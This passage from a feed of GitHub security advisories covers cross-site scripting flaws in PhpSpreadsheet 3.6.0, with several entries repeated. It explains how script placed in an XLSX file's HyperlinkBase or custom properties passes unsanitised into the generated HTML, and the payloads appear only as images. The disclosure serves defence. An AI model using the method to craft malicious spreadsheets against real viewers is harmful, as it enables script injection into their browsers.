vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 8. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>\n<p><img alt=\"fig14\" src=\"https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3\"></p>\n<p><em>Figure 14. Embedding the payload</em> </p>\n<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig15\" src=\"https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba\"></p>\n<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>\n<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.\n<img src=\"https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5\" alt=\"fig16\" width=\"356\"></p>\n<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56411\">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header",
            "date_modified": "2025-01-03T19:24:57.000Z",
            "date_published": "2025-01-03T17:28:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header\">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateHTMLHeader</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 8. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>\n<p><img alt=\"fig14\" src=\"https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3\"></p>\n<p><em>Figure 14. Embedding the payload</em> </p>\n<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig15\" src=\"https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba\"></p>\n<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>\n<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.\n<img src=\"https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5\" alt=\"fig16\" width=\"356\"></p>\n<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56411\">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header",
            "date_modified": "2025-01-03T19:24:57.000Z",
            "date_published": "2025-01-03T17:28:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header\">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateHTMLHeader</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 8. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>\n<p><img alt=\"fig14\" src=\"https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3\"></p>\n<p><em>Figure 14. Embedding the payload</em> </p>\n<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig15\" src=\"https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba\"></p>\n<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>\n<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.\n<img src=\"https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5\" alt=\"fig16\" width=\"356\"></p>\n<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56411\">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header",
            "date_modified": "2025-01-03T19:24:57.000Z",
            "date_published": "2025-01-03T17:28:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-in-custom-properties\">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is generated without clearing custom properties\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateMeta</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 9. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>\n<p><img alt=\"fig17\" src=\"https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f\"></p>\n<p><em>Figure 17. Embedding the payload</em></p>\n<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig18\" src=\"https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc\"></p>\n<p><em>Figure 18. Getting a custom property</em></p>\n<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>\n<p><img alt=\"fig19\" src=\"https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86\"></p>\n<p><em>Figure 19. Getting a custom property</em></p>\n<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>\n<img src=\"https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef\" alt=\"fig20\" width=\"356\">\n\n<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56410\">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv23-996v-q229\">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv23-996v-q229",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties",
            "date_modified": "2025-01-03T20:12:10.000Z",
            "date_published": "2025-01-03T17:25:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv23-996v-q229"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-in-custom-properties\">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is generated without clearing custom properties\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateMeta</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 9. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>\n<p><img alt=\"fig17\" src=\"https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f\"></p>\n<p><em>Figure 17. Embedding the payload</em></p>\n<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig18\" src=\"https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc\"></p>\n<p><em>Figure 18. Getting a custom property</em></p>\n<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>\n<p><img alt=\"fig19\" src=\"https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86\"></p>\n<p><em>Figure 19. Getting a custom property</em></p>\n<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>\n<img src=\"https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef\" alt=\"fig20\" width=\"356\">\n\n<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56410\">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv23-996v-q229\">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv23-996v-q229",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties",
            "date_modified": "2025-01-03T20:12:10.000Z",
            "date_published": "2025-01-03T17:25:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv23-996v-q229"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-in-custom-properties\">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is generated without clearing custom properties\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateMeta</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 9. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>\n<p><img alt=\"fig17\" src=\"https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f\"></p>\n<p><em>Figure 17. Embedding the payload</em></p>\n<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig18\" src=\"https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc\"></p>\n<p><em>Figure 18. Getting a custom property</em></p>\n<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>\n<p><img alt=\"fig19\" src=\"https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86\"></p>\n<p><em>Figure 19. Getting a custom property</em></p>\n<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>\n<img src=\"https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef\" alt=\"fig20\" width=\"356\">\n\n<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56410\">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv23-996v-q229\">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv23-996v-q229",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties",
            "date_modified": "2025-01-03T20:12:10.000Z",
            "date_published": "2025-01-03T17:25:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv23-996v-q229"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-in-custom-properties\">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is generated without clearing custom properties\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateMeta</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 9. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>\n<p><img alt=\"fig17\" src=\"https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f\"></p>\n<p><em>Figure 17. Embedding the payload</em></p>\n<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig18\" src=\"https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc\"></p>\n<p><em>Figure 18. Getting a custom property</em></p>\n<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>\n<p><img alt=\"fig19\" src=\"https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86\"></p>\n<p><em>Figure 19. Getting a custom property</em></p>\n<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>\n<img src=\"https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef\" alt=\"fig20\" width=\"356\">\n\n<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56410\">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv23-996v-q229\">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv23-996v-q229",
            "title": "[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties",
            "date_modified": "2025-01-03T20:12:10.000Z",
            "date_published": "2025-01-03T17:25:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv23-996v-q229"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthorized-reflected-xss-in-currencyphp-file\">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file\n<strong>Exploitation conditions</strong>: an unauthorized user\n<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 